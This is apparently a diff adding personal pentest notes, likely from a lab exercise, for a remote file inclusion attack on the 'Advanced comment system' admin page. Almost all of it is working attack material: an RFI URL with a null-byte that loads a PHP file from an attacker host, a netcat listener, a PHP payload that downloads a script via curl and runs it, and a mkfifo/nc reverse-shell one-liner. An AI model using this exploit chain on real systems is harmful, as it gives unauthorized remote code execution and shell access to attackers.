@@ -1,0 +1,19 @@
+Advanced comment system - Administration
+RFI -> http://1<IP>/internal/advanced_comment_system/admin.php?ACS_path=http://<KALI IP>/rce.php%00
+
+start <nc -lvnp 443> 
+
+rce.php contents
+<?php 
+system('id');
+system('curl http://192.168.119.174/rev.sh -o /dev/shm/rev.sh');
+system('chmod +x /dev/shm/rev.sh'); 
+system('pwd');
+system('ls -lart');
+system('ls -lart /dev/shm');
+system('cat /dev/shm/rev.sh');
+system('bash /dev/shm/rev.sh'); 
+?>
+
+rev.sh contents
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <Kali IP> 443 >/tmp/f
